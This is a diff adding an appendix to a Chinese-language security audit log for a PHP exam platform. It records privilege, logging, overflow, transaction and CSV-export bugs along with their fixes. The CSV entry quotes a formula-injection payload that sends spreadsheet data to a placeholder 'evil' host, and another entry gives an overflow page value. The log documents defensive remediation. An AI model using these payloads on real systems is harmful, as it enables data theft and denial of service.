@@ -1730,3 +1730,127 @@ Core\newPdo(): Argument #5 ($pass) must be of type string, int given
 
 **判据口诀**：先问「本项目有没有调用点」，再问「触发条件在本项目成不成立」，
 两者皆否 → 记为「不可达，不回灌」，避免以后重复分析。
+
+---
+
+## 附录：业务层与权限点专项排查（2026-10-02 续）
+
+**约束**：本轮**不动 `core/`**（内部分叉），只改 `app/`。
+**方法**：两个 Explore 子代理并行审计「考生端考试全流程」与「教师端/管理端写操作」，
+主代理**逐条回源码验证**后才动手（这一步很有必要：子代理把 `InvigilationService::submitAll()`
+报成 `public static`，实际是实例方法，若不核实会写出跑不通的补丁）。
+
+**统一根因：守卫只打在某一个入口。** 21 条发现里 6 条同型——
+`savel/update`、`save/paper`、`submitAll/endExam`、`autoClean/doAdvancedClean`、管理端/教师端同一守卫
+一处有一处无。修法不是逐处补条件，而是**收敛到共用地标**（复用 `page()`、复用 `csvSafe()`、
+统一 `beginTransaction/commit/rollBack` 模板）。
+
+### BUG-258 ｜【P0】教师端「编辑考试」可把考试过户给任意教师（横向越权）
+
+- **位置**：`app/Controllers/TeacherExamController.php` `update()`；配套 `collectParams()`
+- **现象**：教师 `PUT /api/teacher/exams/{自己id}` 且 body 带 `exam_tea=他人姓名`，
+  考试归属被改写。对方随即获得该考试的 `open/start/generate/delete/grade/retake` 全套操作权
+  （`assertOwnExam` 就是按 `exam_tea` 名称比对）。传空串则该考试从所有教师端列表消失，只剩管理员能回收。
+- **根因**：BUG-241 的修复只打在 `create()`（`:186-188`）与 `retake()`（`:306`）两处，
+  `update()` 是**同型入口但被漏掉**；且 `exam_tea` 在 `Exam::$fillable` 内，
+  `collectParams()` 又会原样带出该字段。前端 `exam-editor.js:535` 确实会提交它。
+- **修复**：`update()` 在 `collectParams()` 之后强制 `$data['exam_tea']` 取 `authTeacher()['tea_name']`，
+  与 `save()` 同源。三处口径统一。
+
+### BUG-259 ｜【P0】审计日志落到 `admin.access` 兜底，任意管理员角色可读
+
+- **位置**：`app/Middlewares/SessionAuthMiddleware.php` `IDENTITY_RULES`
+- **现象**：`GET /api/admin/logs` 未登记前缀 → `resolveRule()` 的 `str_starts_with` 逐条匹配
+  时落到兜底 `['/api/admin/', 'admin', 'admin.access']`；GET 又走 `SAFE_METHODS` 短路只取 readPoint。
+  而 `admin.access` 是**四个内置角色全部持有**的兜底点。
+- **影响**：`admin_log` 全量泄露（`actor_name`/`ip`/`target`/结构化 `detail`），
+  而 `detail` 里含教师端写入的 `exam_pwd`（考场口令）与 `roster`（准考证号列表）——
+  等于**从日志侧绕过了教师端归属校验**把受保护数据导出去。
+- **修复**：在兜底规则**之前**插入 `['/api/admin/logs', 'admin', 'system.manage']`。
+
+### BUG-260 ｜【P2】错题本/资料分页 `page` 无上限 → offset 溢出 500
+
+- **位置**：`StudentWrongBookController::index()`、`StudentController::materials()`
+- **现象**：`?page=9223372036854775807`（PHP_INT_MAX）通过 `integer|min:1` 校验，
+  `($page-1)*$perPage` 溢出成浮点，`"LIMIT {$perPage} OFFSET {$offset}"` 插值成
+  `OFFSET 1.8446744073709552E+20` → MySQL 语法错误 → 500。单个请求即可稳定触发。
+- **根因**：`BaseController::page()` 里**已有** `min(1_000_000, …)` 防护（注释还写明了这个坑），
+  但这两处自己实现了 `max(1, (int) …)`，**没复用**。
+- **修复**：两处改用 `$this->page()`（**返回关联数组**，须用 `$p['page']`/`$p['per_page']` 取值，
+  不能用 `[$page, $perPage] = …` 数字下标解构——page() 的键是 page/per_page/offset/keyword，
+  数字下标会抛 `Undefined array key 0`）。`Material::list(array, int $offset, …)` 签名本就拒浮点，
+  反证溢出必然 500。
+- **附带**：`materials()` 的 `per_page` 下限由 5 变 1（上限 60 不变），无安全影响。
+- **踩坑记录（排查耗时最长的一个）**：改完后回归出现 6 FAIL，插桩却「完全不执行」，
+  一度误判为 opcache 缓存或请求没进控制器。**真因有两个**：
+  ① 探针路径写成 `__DIR__ . '/../temp/x.log'`，而控制器在 `app/Controllers/`，
+     往上**两级**才是项目根，`app/temp/` 不存在 → `file_put_contents` 静默失败，
+     让我误以为「代码没执行」，白绕了几轮；
+  ② 真正的产品缺陷是**我自己写错了**：用了 `[$page, $perPage] = $this->page()`，
+     而 `page()` 返回**关联数组**，数字下标解构直接抛 `Undefined array key 0` → 500。
+  教训：① 插桩路径先确认目录真实存在，别用想当然的相对层级；
+  ② `page()` 是关联数组，复用它时**一律按键名取值**，与全项目其他 14 处用法保持一致。
+
+### BUG-261 ｜【P1】教师端导出 CSV 缺公式注入防护
+
+- **位置**：`TeacherExamController::exportScores()`；`InvigilationService::csvSafe()`
+- **现象**：管理端导出经 `InvigilationService::csv()` 自动享有 `csvSafe()`，
+  教师端是**独立实现**、直接 `fputcsv` 原始字段。姓名为
+  `=HYPERLINK("http://evil/leak?"&A1,"点我")` 的考生，在监考教师用 Excel/WPS 打开导出文件时
+  公式被执行（可触发 DDE / 外带请求）。教师端是**批量导出全场**，一次命中即泄露整场。
+- **根因**：防护放在服务层私有方法而非共用工具，后写的教师端导出未复用。
+- **修复**：`csvSafe()` 由 `private` 提为 `public static`，教师端改调之，两端共用同一实现。
+
+### BUG-262 ｜【P1】管理端「编辑考试」的组卷参数守卫只在 testing 生效
+
+- **位置**：`app/Controllers/Admin/ExamController.php` `update()`；对照教师端同名守卫
+- **现象**：管理端守卫包在 `if (exam_status === STATUS_TESTING)` 里，而教师端是**无条件** `$hasPaper > 0`。
+  但 `generateForClass()`/`markReady()` 出题成功后状态已是 `paper`，
+  而「paper 状态」与「已有 stupaper 行」是**常态同时成立** ——
+  守卫恰好在出题后到惰性自动开考前这段最需要的窗口里失效。
+- **影响**：管理员改 `subj_id`/各题数量分 → `recomputeScore()` 覆写 `exam_score`，
+  与已生成试卷的真实满分背离；而 `exam_score` 是**及格判定 / 证书达标 / 补考名单**的唯一依据，
+  会出现「人人 60 分及格」或「无人能拿证书」。`autoGrade` 的封顶按卷面重算所以判分本身不错，
+  错的是对外公布的口径 —— 这类「分数对、标准错」极难排查。
+- **修复**：管理端改为无条件 `$hasPaper > 0` 判断，与教师端同口径。
+
+### BUG-263 ｜【P1】问卷改题连带静默清空考生已提交作答
+
+- **位置**：`app/Services/Survey.php` `save()`；入口 `TeacherSurveyController::save()`
+- **现象**：`save()` 用「全删重建」策略且 DELETE **无条件**：
+  考生已提交后再 `PUT /api/teacher/exams/{id}/survey`（哪怕只改个错别字），
+  `exam_survey_answer` 中该场全部作答被清空，`stats()` 回收率与均值归零且**不可恢复**。
+- **根因**：删题目前置注释解释了「先清答题再清题目」的顺序理由，
+  但**没考虑答题侧是有价值的累积数据**。
+- **修复**：`save()` 增加 `bool $force`；已有作答且未 force 时抛 409 并在消息里告知条数，
+  控制器接 `force=1`，审计日志记 `forced`。
+
+### BUG-264 ｜【P1】全员强制收卷无事务，中途失败留不可回滚的中间态
+
+- **位置**：`app/Services/InvigilationService.php` `submitAll()`
+- **现象**：第 5 名考生判分时抛异常 → 前 4 名 `stu_score` 已落库且 `stu_status='over'`（**已提交**），
+  其余仍 `online`，接口返 500，监考员拿不到 `graded/skipped` 计数。
+  且**重试也救不回来**：`autoGrade()` 的幂等门禁 `LEFT(stu_status,4) != 'over'` 会跳过前 4 名。
+- **根因**：同文件族的 `ExamEngine::endExam()` 有事务（注释明确写了这个坑），
+  `submitAll()` 是「判分但不推进考试状态」的变体，写事务时漏掉了。
+- **修复**：照 `endExam()` 补 `beginTransaction/commit/rollBack`。
+  **嵌套安全性已验证**：`autoGrade()` 内层 `commit()` 在嵌套时只 `RELEASE SAVEPOINT`
+  （`Database::beginTransaction()` 按 `$pdo->inTransaction()` 走 savepoint 分支），
+  外层 `rollBack()` 仍可完整撤销。
+
+### 本轮「已核对无问题」的新增面（避免重复排查）
+
+- **教师端归属校验覆盖面完整**：`TeacherExamController` 14 个方法、`TeacherGradingController` 5 个、
+  `TeacherSurveyController` 2 个、`TeacherMonitorController` 9 个**全部**已调用 `assertOwnExam`/
+  `ownExamId()`。缺口是「归属**可被改写**」（BUG-258），不是「归属**未校验**」。
+- **权限点推导（管理端）**：`exam.*` / `monitor.*`(7 个) / `quiz.*` / `student.import` /
+  `score.backup` / `score.export` / `system.config` / `material.add` 全部正确登记；
+  `writePoint()` 的显式登记**前置顺序正确**（在 `SAFE_METHODS` 短路之前），
+  故 `GET /api/admin/scores/export` 能读到 `score.export` 而不退化成 `score.view`；
+  静态路由优先于参数路由，保证 `/api/admin/students/check-id` 不被 `{id}` 抢匹配。
+- **题型判分**：`normalizeAnswer()` 签名是 `string`、先 `strtoupper` 再 `str_split`，
+  不会收到数组；`isCorrect()` 用 `=== ` 严格比较，**全项目无松散 `==` juggling**；
+  多选去重升序防「`ACC` 与 `AC` 判不等」。
+- **幂等性**：重复交卷（`LEFT(stu_status,4)!='over'` + `rowCount()===0` 回查既有成绩）、
+  重复批阅（全量覆盖写）、重复出题（事务内 + `FOR UPDATE`）、
+  重复问卷（`ON DUPLICATE KEY UPDATE` + `UNIQUE(qid,stu_id)`）均已正确。
